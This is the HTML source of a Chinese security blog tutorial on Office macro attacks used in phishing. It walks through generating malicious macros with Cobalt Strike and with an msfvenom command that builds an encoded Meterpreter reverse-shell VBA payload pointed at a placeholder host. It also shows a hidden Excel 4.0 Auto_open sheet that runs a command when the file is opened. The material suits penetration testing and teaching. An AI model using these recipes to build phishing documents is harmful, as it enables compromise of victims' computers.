@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  
+  <title>
+    office宏攻击 | Leticia‘s Blog 
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+  <meta name="author" content="麻薯">
+
+
+
+  <meta name="keywords" content=",office">
+<meta name="description" content="前言office宏攻击是钓鱼邮件场景中最常见的攻击手段，其制作简单，兼容性强，非常适合批量攻击，但由于其需要用户交互，隐蔽性差，攻击能否成功基本取决于目标的安全意识强弱。
+宏病毒office宏病毒一般寄存于office文档中，如word，excel，ppt，以excel最常见，当用户打开这种文档时，内置的宏命令就会执行，在计算机中执行恶意命令。
+一般的恶意命令会自动访问提前部署好的恶意服务器下载木">
+<meta property="og:type" content="article">
+<meta property="og:title" content="office宏攻击 | Leticia‘s Blog">
+<meta property="og:url" content="http://yoursite.com/2020/08/20/office宏攻击/index.html">
+<meta property="og:site_name" content="Leticia‘s Blog">
+<meta property="og:description" content="前言office宏攻击是钓鱼邮件场景中最常见的攻击手段，其制作简单，兼容性强，非常适合批量攻击，但由于其需要用户交互，隐蔽性差，攻击能否成功基本取决于目标的安全意识强弱。
+宏病毒office宏病毒一般寄存于office文档中，如word，excel，ppt，以excel最常见，当用户打开这种文档时，内置的宏命令就会执行，在计算机中执行恶意命令。
+一般的恶意命令会自动访问提前部署好的恶意服务器下载木">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/office/office_01.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/office/office_02.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/office/office_03.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/office/office_04.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/office/office_05.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/office/office_06.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/office/office_07.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/office/office_08.png?raw=true">
+<meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/office/office_09.png?raw=true">
+<meta property="og:updated_time" content="2020-11-20T12:56:51.245Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="office宏攻击 | Leticia‘s Blog">
+<meta name="twitter:description" content="前言office宏攻击是钓鱼邮件场景中最常见的攻击手段，其制作简单，兼容性强，非常适合批量攻击，但由于其需要用户交互，隐蔽性差，攻击能否成功基本取决于目标的安全意识强弱。
+宏病毒office宏病毒一般寄存于office文档中，如word，excel，ppt，以excel最常见，当用户打开这种文档时，内置的宏命令就会执行，在计算机中执行恶意命令。
+一般的恶意命令会自动访问提前部署好的恶意服务器下载木">
+<meta name="twitter:image" content="https://github.com/echohun/blog_image/blob/master/office/office_01.png?raw=true">
+
+  <!-- favicon icon files -->
+
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+  <link rel="icon" href="/images/favicon.ico">
+
+  <!-- css files -->
+  <link rel="stylesheet" href="/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/css/uno.css">
+  <link rel="stylesheet" href="/css/tagscloud.css">
+  <link rel="stylesheet" href="/css/links.css">
+  <link rel="stylesheet" href="/css/archive.css">
+  <link rel="stylesheet" href="/css/jquery.fancybox.css">
+  <link href="//cdn.bootcss.com/highlight.js/9.8.0/styles/monokai-sublime.min.css" rel="stylesheet">
+  <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<body>
+  <!-- mobile menu -->
+  <span class="mobile btn-mobile-menu">
+    <i class="fa btn-mobile-menu__icon fa-bars" aria-hidden="true"></i>
+  </span>
+  <!-- side panel -->
+  
+  <header class="panel-cover panel-cover--collapsed">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+      
+        <a href="/" title="link to homepage for Leticia‘s Blog"><img src="/images/avatar.jpg" width="80" alt="Leticia‘s Blog logo" class="panel-cover__logo logo" /></a>
+      
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">麻薯</a></h1>
+        <hr class="panel-cover__divider" />
+        
+        <p class="panel-cover__description">
+          She will never see the day it blossoms,maybe.
+        </p>
+        <hr class="panel-cover__divider" />
+        
+        <!-- TagsCloud -->
+        
+
+  <div id="tagscloud">
+<a href="/tags/渗透测试/" class="tagc1">渗透测试 : 47</a><a href="/tags/机器学习/" class="tagc2">机器学习 : 13</a><a href="/tags/笔记/" class="tagc3">笔记 : 13</a><a href="/tags/python/" class="tagc4">python : 12</a><a href="/tags/php/" class="tagc5">php : 10</a><a href="/tags/mysql/" class="tagc1">mysql : 7</a><a href="/tags/网络安全/" class="tagc2">网络安全 : 5</a><a href="/tags/sql注入/" class="tagc3">sql注入 : 5</a><a href="/tags/暴力破解/" class="tagc4">暴力破解 : 5</a><a href="/tags/rop/" class="tagc5">rop : 4</a><a href="/tags/工具配置/" class="tagc1">工具配置 : 3</a><a href="/tags/ctf/" class="tagc2">ctf : 3</a><a href="/tags/内网渗透/" class="tagc3">内网渗透 : 3</a><a href="/tags/文件上传/" class="tagc4">文件上传 : 3</a><a href="/tags/shell/" class="tagc5">shell : 2</a><a href="/tags/XSS/" class="tagc1">XSS : 2</a><a href="/tags/代码审计/" class="tagc2">代码审计 : 2</a><a href="/tags/linux/" class="tagc3">linux : 2</a><a href="/tags/逻辑处理漏洞/" class="tagc4">逻辑处理漏洞 : 2</a><a href="/tags/密码学/" class="tagc5">密码学 : 2</a>
+</div>
+
+        <div class="navigation-wrapper">
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+            
+              
+              <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客</a></li>
+            
+              
+              <li class="navigation__item"><a href="/archive/" title="" class="">归档</a></li>
+            
+              
+              <li class="navigation__item"><a href="/links/" title="" class="">友链</a></li>
+            
+            </ul>
+          </nav>
+          
+<hr class="panel-cover__divider">
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/echohun" title="麻薯's GitHub">
+          <i class='fa fa-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+        </div>
+      </div>
+    </div>
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+  <div class="content-wrapper">
+    <div class="content-wrapper__inner entry">
+      <!-- body panel -->
+      
+<article class="post-container post-container--single">
+  <header class="post-header">
+    <h1 class="post-title">office宏攻击</h1>
+    
+    <div class="post-meta">
+      <time datetime="2020-08-20 20:50:00" class="post-meta__date date">2020-08-20 20:50:00</time> 
+      <span class="post-meta__tags tags">
+      
+        <font class="categories">&#8226; 分类:
+        <a class="categories-link" href="/categories/渗透测试/">渗透测试</a>
+        </font>
+      
+      
+        &#8226; 标签:
+        <font class="tags">
+        <a class="tags-link" href="/tags/office/">office</a>
+        </font>
+      
+      </span>
+    </div>
+    
+  </header>
+  <section id="post-content" class="article-content post">
+  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>office宏攻击是钓鱼邮件场景中最常见的攻击手段，其制作简单，兼容性强，非常适合批量攻击，但由于其需要用户交互，隐蔽性差，攻击能否成功基本取决于目标的安全意识强弱。</p>
+<h2 id="宏病毒"><a href="#宏病毒" class="headerlink" title="宏病毒"></a>宏病毒</h2><p>office宏病毒一般寄存于office文档中，如word，excel，ppt，以excel最常见，当用户打开这种文档时，内置的宏命令就会执行，在计算机中执行恶意命令。</p>
+<p>一般的恶意命令会自动访问提前部署好的恶意服务器下载木马程序到本地并运行，从而控制计算机。</p>
+<h2 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h2><h3 id="CobaltStrike生成office宏病毒"><a href="#CobaltStrike生成office宏病毒" class="headerlink" title="CobaltStrike生成office宏病毒"></a>CobaltStrike生成office宏病毒</h3><p>使用CobaltStrike的宏病毒生成功能可以轻松生成恶意宏代码，部署CobaltStrike服务器并打开客户端，创建一个监听器</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_01.png?raw=true" alt=""></p>
+<p>然后点击Attacks-Package-MS Office Macro-选定监听器-生成对应的宏病毒-复制到剪贴板</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_02.png?raw=true" alt=""></p>
+<p>然后创建一个新word-视图-查看宏中新建一个宏名</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_03.png?raw=true" alt=""></p>
+<p>在里面粘贴刚才复制的宏，并在保存时点击否另存为.doxm文件</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_04.png?raw=true" alt=""></p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_05.png?raw=true" alt=""></p>
+<p>当打开word文档并点击启用宏代码时，就会触发宏，反弹shell到Cobalt Strike中</p>
+<h3 id="msf生成vba文件"><a href="#msf生成vba文件" class="headerlink" title="msf生成vba文件"></a>msf生成vba文件</h3><p>使用msf生成vba文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 lhost=xx.xx.xx.xx lport=4444 -f vba -o 123.vba</div></pre></td></tr></table></figure></p>
+<p>后面的步骤与CobaltStrike中相似，创建一个新word-视图-查看宏中新建一个宏名</p>
+<p>在里面粘贴刚才复制的宏，并在保存时点击否另存为.doxm文件</p>
+<p>当打开word文档并点击启用宏代码时，就会触发宏，反弹shell到msf中</p>
+<h3 id="使用excel4-0宏执行命令"><a href="#使用excel4-0宏执行命令" class="headerlink" title="使用excel4.0宏执行命令"></a>使用excel4.0宏执行命令</h3><p>创建一个word或excel文档，如果是word需要插入excel工作表</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_06.png?raw=true" alt=""></p>
+<p>右键点击底部的sheet-插入，选择MS Excel 4.0宏表</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_07.png?raw=true" alt=""></p>
+<p>在表格中写入= EXEC(“calc.exe”)</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_08.png?raw=true" alt=""></p>
+<p>点击此格，将单元格命名为Auto_open，并可以将此sheet右键隐藏，重新打开word文档将会自动执行命令。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_09.png?raw=true" alt=""></p>
+<h3 id="在excel中嵌入宏代码"><a href="#在excel中嵌入宏代码" class="headerlink" title="在excel中嵌入宏代码"></a>在excel中嵌入宏代码</h3><p>excel中可以直接嵌入dde指令，参考csv注入中的攻击方式即可。</p>
+<p>参考文档：<br><a href="http://next.uuzdaisuki.com/2020/07/16/csv%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" target="_blank" rel="external">http://next.uuzdaisuki.com/2020/07/16/csv%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</a></p>
+
+  </section>
+  <div class="copyright">
+    <span>文本标题:</span><a href="/2020/08/20/office宏攻击/" target="_blank">office宏攻击</a><br />
+    <span>文章作者:</span><a href="/" title="回到主页" target="_blank">麻薯</a><br />
+    <span>发布时间:</span>2020-08-20 20:50:00<br />
+    <span>最后更新:</span>2020-11-20 20:56:51<br />
+    <span>原始链接:</span><a href="http://www.uuzdaisuki.com">www.uuzdaisuki.com</a><br />
+    <span>转载声明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
+  </div>
+</article>
+      <!-- footer panel -->
+      <footer class="footer">
+	<center>
+    <span class="footer__copyright">&copy; 2016-2017. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/virink/vhuno">vHuno</a></span>
+    <span>本站采用<i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+    </center>
+</footer>
+    </div>
+  </div>
+  <!-- js files -->
+  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/js/main.js"></script>
+  <script src="/js/scale.fix.js"></script>
+  <script src="/js/tagcloud.js"></script>
+  
+  
+	<script src="/js/jquery.fancybox.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			$(".fancybox").fancybox({
+	            padding: 0,
+	            helpers: {
+	                overlay: {
+	                  locked: false
+	                }
+	            }
+	        });
+		});
+	</script>
+
+  
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+    MathJax.Hub.Config({ 
+        tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+    });
+});
+    </script>
+
+  <script src="//cdn.bootcss.com/highlight.js/9.8.0/highlight.min.js"></script>
+  <script src="/js/gallery.js"></script>
+  <script>
+  $(document).ready(function(){
+    hljs.initHighlightingOnLoad();
+  });
+  </script>
+  
+  
+<div id="totop" style="position: fixed; bottom: 50px; right: 30px; cursor: pointer; opacity: 1;">
+	<a title="back to top"><img style="width:30px;height:30px;" src="/images/totop.png"></a>
+</div>
+<script>
+    (function($) {
+        var upperLimit = 100;
+        var scrollElem = $('#totop');
+        var scrollSpeed = 500;
+        scrollElem.hide();
+        $(window).scroll(function() {
+            var scrollTop = $(document).scrollTop();
+            if (scrollTop > upperLimit) {
+                $(scrollElem).stop().fadeTo(300, 1); // fade back in
+            } else {
+                $(scrollElem).stop().fadeTo(300, 0); // fade out
+            }
+        });
+        $(scrollElem).click(function() {
+            $('html, body').animate({
+                scrollTop: 0
+            }, scrollSpeed);
+            return false;
+        });
+    })(jQuery);
+    </script>
+
+
+  <!-- Analytics Google -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-83885261-1', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+
+  <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+</body>
+</html>
